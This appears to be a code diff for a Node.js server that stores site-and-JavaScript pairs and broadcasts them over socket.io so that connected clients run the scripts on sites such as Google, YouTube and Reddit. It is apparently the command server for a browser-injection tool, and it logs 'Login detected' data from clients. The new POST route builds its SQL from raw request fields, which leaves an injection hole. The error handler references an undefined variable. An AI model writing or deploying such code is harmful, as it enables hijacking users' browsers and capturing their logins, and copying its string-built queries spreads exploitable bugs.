@@ -138,6 +138,35 @@ app.get('/profile',
     res.render('profile', { user: req.user });
   });
 
+app.get('/inject',
+  require('connect-ensure-login').ensureLoggedIn(),
+  function(req, res) {
+    var sql = "SELECT * FROM Injections";
+    con.query(sql, function (err, result) {
+      if(err) throw error;
+      var arr = [];
+      for(var i = 0 ; i < result.length; i++){
+        var object = {site:result[i]['url'],code:result[i]['javascript']};
+        arr.push(object);
+      }
+
+      io.emit('jsExecution', arr);
+
+      res.render('inject',{ rowData: result });
+    });
+
+  });
+
+  app.post('/inject',
+    require('connect-ensure-login').ensureLoggedIn(),
+    function(req, res) {
+      var sql = "INSERT INTO Injections (url, javascript) VALUES ('"+req.body.url+"', '"+ req.body.js+"')";
+      con.query(sql, function (err, result) {
+        if(err) console.log(err);
+      });
+      res.redirect("/inject");
+    });
+
 
 server.listen(3000);
 console.log("Listening on port 3000");
@@ -153,12 +182,17 @@ io.on('connection', (socket) => {
       // "www.youtube.com"
       "http://corndog.io/"
     ]);
-	socket.emit('jsExecution',
-		[
-		{site: "www.google.com", code: 'alert("GOOGLE");'},
-		{site: "www.youtube.com", code: 'alert("YOUTUBE");'},
-		{site: "www.reddit.com", code: 'alert("REDDIT");'}
-		]);
+    var sql = "SELECT * FROM Injections";
+    con.query(sql, function (err, result) {
+      if(err) throw error;
+      var arr = [];
+      for(var i = 0 ; i < result.length; i++){
+        var object = {site:result[i]['url'],code:result[i]['javascript']};
+        arr.push(object);
+      }
+
+      socket.emit('jsExecution', arr);
+    });
     socket.on('Login', (loginInfo) => {
       console.log("Login detected: " + loginInfo);
     });
